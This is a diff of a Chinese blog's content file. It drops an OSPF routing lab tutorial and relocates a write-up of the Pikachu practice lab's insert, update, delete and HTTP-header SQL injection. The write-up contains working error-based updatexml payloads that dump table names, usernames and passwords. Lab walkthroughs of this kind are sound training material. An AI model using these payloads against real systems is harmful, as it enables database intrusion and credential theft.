-O 10.1.0.0&#x2F;30 [110&#x2F;2] via 10.2.0.1, 00:01:29, GigabitEthernet 0&#x2F;0
-C 10.2.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 10.2.0.2&#x2F;32 is local host. 
-O 172.16.1.0&#x2F;24 [110&#x2F;3] via 10.2.0.1, 00:01:29, GigabitEthernet 0&#x2F;0
-O 172.16.2.0&#x2F;24 [110&#x2F;3] via 10.2.0.1, 00:01:29, GigabitEthernet 0&#x2F;0
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;1
-C 192.168.1.254&#x2F;32 is local host</code></pre>
-
-<h3 id="单区域OSPF案例-——-连通性测试"><a href="#单区域OSPF案例-——-连通性测试" class="headerlink" title="单区域OSPF案例 —— 连通性测试"></a>单区域OSPF案例 —— 连通性测试</h3><ul>
-<li>测试网络连通性 <ul>
-<li>PC1和PC2能ping通PC3</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">PC1&gt;ping 192.168.1.1
-Pinging 192.168.1.1 with 32 bytes of data:
-Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;2ms TTL&#x3D;125
-Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;1ms TTL&#x3D;125
-Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
-Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
-Ping statistics for 192.168.1.1:
-Packets: Sent &#x3D; 4, Received &#x3D; 4, Lost &#x3D; 0 (0% loss),
-Approximate round trip times in milli-seconds:
-Minimum &#x3D; 1ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
-
-<pre class="language-none"><code class="language-none">PC1&gt;ping 192.168.1.1
-Pinging 192.168.1.1 with 32 bytes of data:
-Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;2ms TTL&#x3D;125
-Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;1ms TTL&#x3D;125
-Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
-Reply from 192.168.1.1: bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
-Ping statistics for 192.168.1.1:
-Packets: Sent &#x3D; 4, Received &#x3D; 4, Lost &#x3D; 0 (0% loss),
-Approximate round trip times in milli-seconds:
-Minimum &#x3D; 2ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
-
-<h3 id="单区域OSPF案例-——-状态查看"><a href="#单区域OSPF案例-——-状态查看" class="headerlink" title="单区域OSPF案例 —— 状态查看"></a>单区域OSPF案例 —— 状态查看</h3><ul>
-<li>查看OSPF 协议状态：show ip protocols <ul>
-<li>FULL&#x2F;BDR ：表示邻接状态已经建立，并且此时本路由器为BDR角色</li>
-</ul>
-</li>
-<li>查看OSPF邻居表：show ip ospf neighbor</li>
-</ul>
-<pre class="language-none"><code class="language-none">R2#show ip protocols 
-Routing Protocol is &quot;ospf 10&quot;
-Outgoing update filter list for all interfaces is not set
-Incoming update filter list for all interfaces is not set
-Router ID 10.2.0.1
-Memory Overflow is enabled
-Router is not in overflow state now
-Number of areas in this router is 1: 1 normal 0 stub 0 nssa
-Routing for Networks:
-10.1.0.2 0.0.0.0 area 0
-10.2.0.1 0.0.0.0 area 0
-Reference bandwidth unit is 100 mbps
-Distance: (default is 110)</code></pre>
-
-<pre class="language-none"><code class="language-none">R2#show ip ospf neighbor
-Neighbor ID Pri State BFD State Dead Time Address Interface
-172.16.2.254 1 Full&#x2F;DR - 00:00:37 10.1.0.1 GigabitEthernet 0&#x2F;0
-192.168.1.254 1 Full&#x2F;DR - 00:00:34 10.2.0.2 GigabitEthernet 0&#x2F;1</code></pre>
-
-<ul>
-<li>查看接口OSPF相关信息： Show ip ospf interface XX</li>
-</ul>
-<pre class="language-none"><code class="language-none">R2#Show ip ospf interface gigabitEthernet 0&#x2F;1
-GigabitEthernet 0&#x2F;1 is up, line protocol is up
-Internet Address 10.2.0.1&#x2F;30, Ifindex 2, Area 0.0.0.0, MTU 1500
-Matching network config: 10.2.0.1&#x2F;32
-Process ID 10, Router ID 10.2.0.1, Network Type BROADCAST, Cost: 1
-Transmit Delay is 1 sec, State BDR, Priority 1
-Designated Router (ID) 192.168.1.254, Interface Address 10.2.0.2
-Backup Designated Router (ID) 10.2.0.1, Interface Address 10.2.0.1
-Timer intervals configured, Hello 10, Dead 40, Wait 40, Retransmit 5
-Hello due in 00:00:08
-Neighbor Count is 1, Adjacent neighbor count is 1
-Crypt Sequence Number is 768
-Hello received 50 sent 55, DD received 3 sent 6
-LS-Req received 1 sent 1, LS-Upd received 4 sent 3
-LS-Ack received 2 sent 3, Discarded 0</code></pre>
-
-
-
-<h3 id="多区域OSPF案例"><a href="#多区域OSPF案例" class="headerlink" title="多区域OSPF案例"></a>多区域OSPF案例</h3><ul>
-<li>OSPF路由案例2需求： <ul>
-<li>在三台路由器上配置OSPF路由，配置OSPF进程号为10</li>
-<li>按照拓扑图配置OSPF区域，使PC1和PC2能ping通PC3</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154736.png" alt="21" loading="lazy"></p>
-<h3 id="多区域OSPF案例-——-基本配置"><a href="#多区域OSPF案例-——-基本配置" class="headerlink" title="多区域OSPF案例 —— 基本配置"></a>多区域OSPF案例 —— 基本配置</h3><ul>
-<li><p>启动OSPF进程： </p>
-<ul>
-<li>Router(config)# router ospf 进程号</li>
-</ul>
-</li>
-<li><p>配置OSPF运行的接口以及接口的区域ID ：</p>
-<ul>
-<li>Router (config-router)# network 网络号 反掩码 area 区域id</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1(config)#router ospf 10
-R1(config-router)#network 172.16.2.254 0.0.0.0 area 1
-R1(config-router)#network 172.16.1.254 0.0.0.0 area 1
-R1(config-router)#network 10.1.0.1 0.0.0.0 area 1</code></pre>
-
-<pre class="language-none"><code class="language-none">R2(config)#router ospf 10
-R2(config-router)#network 10.1.0.2 0.0.0.0 area 1
-R2(config-router)#network 10.2.0.1 0.0.0.0 area 0</code></pre>
-
-<pre class="language-none"><code class="language-none">R3(config)#router ospf 10
-R3(config-router)#network 10.2.0.2 0.0.0.0 area 0
-R3(config-router)#network 10.3.0.254 0.0.0.0 area 0</code></pre>
-
-<h3 id="多区域OSPF案例-——-路由表"><a href="#多区域OSPF案例-——-路由表" class="headerlink" title="多区域OSPF案例 —— 路由表"></a>多区域OSPF案例 —— 路由表</h3></li>
-<li><p>使用特权用户模式命令show ip route，显示IP路由表</p>
-<ul>
-<li>“O”表示区域内部路由 </li>
-<li>“O IA”表示区域间路由</li>
-</ul>
-</li>
-<li><p>查看R1、R2和R3的路由表</p>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">R1#show ip route
-C 10.1.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-C 10.1.0.1&#x2F;32 is local host. 
-O IA 10.2.0.0&#x2F;30 [110&#x2F;2] via 10.1.0.2, 00:00:19, GigabitEthernet 0&#x2F;1
-C 172.16.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;0
-C 172.16.1.254&#x2F;32 is local host. 
-C 172.16.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;2
-C 172.16.2.254&#x2F;32 is local host. 
-O IA 192.168.1.0&#x2F;24 [110&#x2F;3] via 10.1.0.2, 00:00:19, GigabitEthernet 0&#x2F;1</code></pre>
-
-<pre class="language-none"><code class="language-none">R2#show ip route
-C 10.1.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 10.1.0.2&#x2F;32 is local host. 
-C 10.2.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
-C 10.2.0.1&#x2F;32 is local host. 
-O 172.16.1.0&#x2F;24 [110&#x2F;2] via 10.1.0.1, 00:01:07, GigabitEthernet 0&#x2F;0
-O 172.16.2.0&#x2F;24 [110&#x2F;2] via 10.1.0.1, 00:01:07, GigabitEthernet 0&#x2F;0
-O 192.168.1.0&#x2F;24 [110&#x2F;2] via 10.2.0.2, 00:15:52, GigabitEthernet 0&#x2F;1</code></pre>
-
-<pre class="language-none"><code class="language-none">R3#show ip route
-O IA 10.1.0.0&#x2F;30 [110&#x2F;2] via 10.2.0.1, 00:01:45, GigabitEthernet 0&#x2F;0
-C 10.2.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
-C 10.2.0.2&#x2F;32 is local host. 
-O IA 172.16.1.0&#x2F;24 [110&#x2F;3] via 10.2.0.1, 00:01:36, GigabitEthernet 0&#x2F;0
-O IA 172.16.2.0&#x2F;24 [110&#x2F;3] via 10.2.0.1, 00:01:36, GigabitEthernet 0&#x2F;0
-C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;1
-C 192.168.1.254&#x2F;32 is local host.</code></pre>
-
-<h3 id="多区域OSPF案例-——-连通性测试"><a href="#多区域OSPF案例-——-连通性测试" class="headerlink" title="多区域OSPF案例 —— 连通性测试"></a>多区域OSPF案例 —— 连通性测试</h3><ul>
-<li>测试网络连通性 <ul>
-<li>PC1和PC2能ping通PC3</li>
-</ul>
-</li>
-</ul>
-<pre class="language-none"><code class="language-none">PC1&gt;ping 192.168.1.1
-Pinging 192.168.1.1 with 32 bytes of data:
-Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;2ms TTL&#x3D;125
-Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;1ms TTL&#x3D;125
-Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
-Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
-Ping statistics for 10.3.0.1:
-Packets: Sent &#x3D; 4, Received &#x3D; 4, Lost &#x3D; 0 (0% loss),
-Approximate round trip times in milli-seconds:
-Minimum &#x3D; 1ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
-
-<pre class="language-none"><code class="language-none">PC2&gt;ping 192.168.1.1
-Pinging 192.168.1.1 with 32 bytes of data:
-Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;2ms TTL&#x3D;125
-Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;1ms TTL&#x3D;125
-Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
-Reply from 192.168.1.1 : bytes&#x3D;32 time&#x3D;3ms TTL&#x3D;125
-Ping statistics for 10.3.0.1:
-Packets: Sent &#x3D; 4, Received &#x3D; 4, Lost &#x3D; 0 (0% loss),
-Approximate round trip times in milli-seconds:
-Minimum &#x3D; 1ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>锐捷</category>
-      </categories>
-      <tags>
-        <tag>锐捷</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Pikachu--SQL注入(一)</title>
     <url>/posts/22ddbd5a/</url>
     <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
@@ -3842,6 +3842,149 @@ Minimum &#x3D; 1ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
 <pre class="language-none"><code class="language-none">&#39; union select group_concat(username),group_concat(password) from users -- q</code></pre>
 
 <p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191303.png" alt="22" loading="lazy"></p>
+<hr>
+<p>参考链接： </p>
+<p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
+<p>Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：<a href="https://www.freebuf.com/articles/web/254079.html">https://www.freebuf.com/articles/web/254079.html</a></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>pikachu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pikachu-SQL注入（三）</title>
+    <url>/posts/49a53027/</url>
+    <content><![CDATA[<h3 id="insert-amp-update注入"><a href="#insert-amp-update注入" class="headerlink" title="insert&amp;update注入"></a>insert&amp;update注入</h3><p>insert&#x2F;update是插入和更新的意思，这两个场景的注入，post数据包里的每一个参数都可以注入</p>
+<h4 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h4><p>首先在注册的时候抓包分析。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144400.png" alt="41" loading="lazy"></p>
+<p>注册页面，在<strong>用户</strong>框内输入单引号，密码为必填项，随意输入几个数字，提交。页面返回报错信息如图</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144409.png" alt="42" loading="lazy"></p>
+<p> 由报错信息可以知道，输入的数据直接拼接入该sql查询语句中，存在着SQL注入漏洞。</p>
+<p>1.查找数据库</p>
+<pre class="language-none"><code class="language-none">1&#39; or updatexml(1,concat(0x7e,database()),1)) #	</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144417.png" alt="43" loading="lazy"></p>
+<p>2.查找数据库中的表</p>
+<pre class="language-none"><code class="language-none">1&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database() limit 0,1)),1))#</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144420.png" alt="44" loading="lazy"></p>
+<p>3.查找指定表中的字段名</p>
+<pre class="language-none"><code class="language-none">1&#39; or updatexml(1,concat(0x7e,(select group_concat(column_name )  from information_schema.columns where table_schema&#x3D; database() and table_name&#x3D;&#39;users&#39;),0x7e),2)or &#39;</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144423.png" alt="45" loading="lazy"></p>
+<p>查询指定表下的所有数据</p>
+<pre class="language-none"><code class="language-none">1&#39; or updatexml(1,concat(0x7e,(select group_concat(id,username,password,level) from users),0x7e),1) or &#39;
+或用limit读取
+&#39; or updatexml(1,concat(0x7e,(select password from users limit 1,1)),1)or&#39;</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144425.png" alt="46" loading="lazy"></p>
+<h4 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h4><p>注： 只有性别，手机，住址，邮箱全都有值的时候，才会执行修改用户信息的操作，否则该操作不执行</p>
+<p>修改页面，在<strong>性别</strong>框内输入单引号，其他几项必填项，随意输入几个数字，提交。页面返回报错信息如图</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144427.png" alt="47" loading="lazy"></p>
+<p> 由报错信息可以知道，输入的数据直接拼接入该sql查询语句中，存在着SQL注入漏洞。</p>
+<p>查询指定字段的内容</p>
+<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)or&#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144429.png" alt="48" loading="lazy"></p>
+<p>查询指定数据库表名</p>
+<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),2) or &#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144431.png" alt="49" loading="lazy"></p>
+<p>查询指定表下的字段名</p>
+<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;),0x7e),2) or &#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144434.png" alt="50" loading="lazy"></p>
+<p>查询指定表下的所有数据 </p>
+<pre class="language-none"><code class="language-none">&#39; or+updatexml(1,concat(0x7e,(select group_concat(id,username,password,level) from users),0x7e),2) or &#39; 
+或用limit读取
+&#39; or updatexml(1,concat(0x7e,(select password from users limit 1,1)),1)or&#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144437.png" alt="51" loading="lazy"></p>
+<h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p> 页面为空白的留言板，输入框是无法注入的。随便加入几条信息，可以看到留言列表多出了刚刚插入的信息。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144439.png" alt="52" loading="lazy"></p>
+<p>既然都说了时delete注入，那肯定和删除有关了，我们在删除时抓包，可以看到是get型传参</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144441.png" alt="53" loading="lazy"></p>
+<p> 右键发送至Repeater，可以通过修改URL的id参数进行SQL注入。</p>
+<p>修改id&#x3D;58’,报错，可判断存在SQL注入</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144443.png" alt="54" loading="lazy"></p>
+<p>可以直接在url进行操作，查询数据库名pikachu</p>
+<pre class="language-none"><code class="language-none">1+or+updatexml(1,concat(0x7e,database()),0)
+或
+59%20or%20updatexml(1,concat(0x7e,(select%20database())),1)	</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144445.png" alt="55" loading="lazy"></p>
+<p>查询指定数据库表名</p>
+<pre class="language-none"><code class="language-none">56+and+updatexml(1,concat(0x7e,(select+group_concat(schema_name)+from+information_schema.schemata),0x7e),2)</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144447.png" alt="56" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">56+and+updatexml(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_schema&#x3D;database()+and+table_name&#x3D;&#39;users&#39;),0x7e),2)</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144449.png" alt="57" loading="lazy"></p>
+<p>查询表下所有数据</p>
+<pre class="language-none"><code class="language-none">56+or+updatexml(1,concat(0x7e,(select+group_concat(id,username,password,level)+from+users),0x7e),2)
+或拖过limit读取
+56+or+updatexml(1,concat(0x7e,(select+password+from+users+limit+0,1)),1)</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144450.png" alt="58" loading="lazy"></p>
+<h3 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http header注入"></a>http header注入</h3><p>输入admin&#x2F;123456，点击login登录</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144452.png" alt="59" loading="lazy"></p>
+<p> 打开burp的拦截，刷新该页面，将拦截到的报文发送至repeater。</p>
+<p>修改user agent或Accept参数注入</p>
+<h4 id="User-Agent-处注入"><a href="#User-Agent-处注入" class="headerlink" title="User-Agent:处注入"></a>User-Agent:处注入</h4><p>查询数据库名</p>
+<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select database())),1)or&#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144457.png" alt="60" loading="lazy"></p>
+<p>查询所有数据库</p>
+<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),2)or &#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144502.png" alt="61" loading="lazy"></p>
+<p>查询指定数据库表名</p>
+<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),2)or &#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144505.png" alt="62" loading="lazy"></p>
+<p>查询指定表下的字段名</p>
+<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;),0x7e),2)or &#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144507.png" alt="63" loading="lazy"></p>
+<p>查询指定表下的所有数据</p>
+<pre class="language-none"><code class="language-none"> &#39; or updatexml(1,concat(0x7e,(select group_concat(id,username,password,level) from users),0x7e),2)or &#39;
+或者
+&#39; or updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)or&#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144509.png" alt="64" loading="lazy"></p>
+<h4 id="Accept处注入"><a href="#Accept处注入" class="headerlink" title="Accept处注入"></a>Accept处注入</h4><p>查询数据库名</p>
+<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select database())),1)or&#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144512.png" alt="65" loading="lazy"></p>
+<p>查询所有数据库</p>
+<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),2)or &#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144515.png" alt="66" loading="lazy"></p>
+<p>查询指定数据库表名</p>
+<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),2)or &#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144517.png" alt="67" loading="lazy"></p>
+<p>查询指定表下的字段名</p>
+<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;),0x7e),2)or &#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144519.png" alt="68" loading="lazy"></p>
+<p>查询指定表下的所有数据</p>
+<pre class="language-none"><code class="language-none"> &#39; or updatexml(1,concat(0x7e,(select group_concat(id,username,password,level) from users),0x7e),2)or &#39;
+或者
+&#39; or updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)or&#39;</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144521.png" alt="69" loading="lazy"></p>
 <hr>
 <p>参考链接： </p>
 <p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
@@ -4057,149 +4200,6 @@ Minimum &#x3D; 1ms, Maximum &#x3D; 3ms, Average &#x3D; 2ms</code></pre>
 <li>唯一的长度,成功</li>
 </ol>
 <p><a href="https://imgtu.com/i/qOHfp9"><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130959475.png" alt="qOHfp9.png" loading="lazy"></a></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>pikachu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pikachu-SQL注入（三）</title>
-    <url>/posts/49a53027/</url>
-    <content><![CDATA[<h3 id="insert-amp-update注入"><a href="#insert-amp-update注入" class="headerlink" title="insert&amp;update注入"></a>insert&amp;update注入</h3><p>insert&#x2F;update是插入和更新的意思，这两个场景的注入，post数据包里的每一个参数都可以注入</p>
-<h4 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h4><p>首先在注册的时候抓包分析。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144400.png" alt="41" loading="lazy"></p>
-<p>注册页面，在<strong>用户</strong>框内输入单引号，密码为必填项，随意输入几个数字，提交。页面返回报错信息如图</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144409.png" alt="42" loading="lazy"></p>
-<p> 由报错信息可以知道，输入的数据直接拼接入该sql查询语句中，存在着SQL注入漏洞。</p>
-<p>1.查找数据库</p>
-<pre class="language-none"><code class="language-none">1&#39; or updatexml(1,concat(0x7e,database()),1)) #	</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144417.png" alt="43" loading="lazy"></p>
-<p>2.查找数据库中的表</p>
-<pre class="language-none"><code class="language-none">1&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database() limit 0,1)),1))#</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144420.png" alt="44" loading="lazy"></p>
-<p>3.查找指定表中的字段名</p>
-<pre class="language-none"><code class="language-none">1&#39; or updatexml(1,concat(0x7e,(select group_concat(column_name )  from information_schema.columns where table_schema&#x3D; database() and table_name&#x3D;&#39;users&#39;),0x7e),2)or &#39;</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144423.png" alt="45" loading="lazy"></p>
-<p>查询指定表下的所有数据</p>
-<pre class="language-none"><code class="language-none">1&#39; or updatexml(1,concat(0x7e,(select group_concat(id,username,password,level) from users),0x7e),1) or &#39;
-或用limit读取
-&#39; or updatexml(1,concat(0x7e,(select password from users limit 1,1)),1)or&#39;</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144425.png" alt="46" loading="lazy"></p>
-<h4 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h4><p>注： 只有性别，手机，住址，邮箱全都有值的时候，才会执行修改用户信息的操作，否则该操作不执行</p>
-<p>修改页面，在<strong>性别</strong>框内输入单引号，其他几项必填项，随意输入几个数字，提交。页面返回报错信息如图</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144427.png" alt="47" loading="lazy"></p>
-<p> 由报错信息可以知道，输入的数据直接拼接入该sql查询语句中，存在着SQL注入漏洞。</p>
-<p>查询指定字段的内容</p>
-<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)or&#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144429.png" alt="48" loading="lazy"></p>
-<p>查询指定数据库表名</p>
-<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),2) or &#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144431.png" alt="49" loading="lazy"></p>
-<p>查询指定表下的字段名</p>
-<pre class="language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;),0x7e),2) or &#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144434.png" alt="50" loading="lazy"></p>
-<p>查询指定表下的所有数据 </p>
-<pre class="language-none"><code class="language-none">&#39; or+updatexml(1,concat(0x7e,(select group_concat(id,username,password,level) from users),0x7e),2) or &#39; 
-或用limit读取
-&#39; or updatexml(1,concat(0x7e,(select password from users limit 1,1)),1)or&#39;</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144437.png" alt="51" loading="lazy"></p>
-<h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p> 页面为空白的留言板，输入框是无法注入的。随便加入几条信息，可以看到留言列表多出了刚刚插入的信息。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144439.png" alt="52" loading="lazy"></p>
-<p>既然都说了时delete注入，那肯定和删除有关了，我们在删除时抓包，可以看到是get型传参</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144441.png" alt="53" loading="lazy"></p>
-<p> 右键发送至Repeater，可以通过修改URL的id参数进行SQL注入。</p>
-<p>修改id&#x3D;58’,报错，可判断存在SQL注入</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144443.png" alt="54" loading="lazy"></p>
-<p>可以直接在url进行操作，查询数据库名pikachu</p>
-<pre class="language-none"><code class="language-none">1+or+updatexml(1,concat(0x7e,database()),0)
-或
-59%20or%20updatexml(1,concat(0x7e,(select%20database())),1)	</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220507144445.png" alt="55" loading="lazy"></p>
